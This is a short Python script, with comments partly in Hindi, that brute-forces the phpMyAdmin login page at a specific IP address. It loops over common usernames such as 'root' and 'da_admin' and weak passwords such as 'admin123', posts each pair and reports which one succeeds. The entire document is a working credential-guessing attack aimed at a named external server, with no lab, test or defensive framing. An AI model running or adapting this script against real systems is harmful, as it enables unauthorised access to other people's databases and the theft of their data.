import requests

target_url = "http://37.97.145.109/phpmyadmin/index.php"
# Common passwords for DirectAdmin/Small setups
passwords = ["admin", "password", "123456", "root", "secret", "directadmin", "admin123"]
users = ["admin", "da_admin", "root"]

def pma_brute():
    session = requests.Session()
    # Pehle page load karo tokens (set-cookie) lene ke liye
    response = session.get(target_url)
    
    print(f"[*] Starting Targeted Brute-Force on phpMyAdmin 5.2.2...")
    
    for user in users:
        for password in passwords:
            payload = {
                'pma_username': user,
                'pma_password': password,
                'server': '1'
            }
            # Mimic a real browser login
            r = session.post(target_url, data=payload)
            
            # Agar login fail hota hai toh response mein 'Access denied' ya login form wapas aata hai
            if "pmaauth" in session.cookies.get_dict():
                print(f"[+++] SUCCESS! User: {user} | Pass: {password}")
                return
            else:
                print(f"[-] Failed: {user}:{password}")

pma_brute()
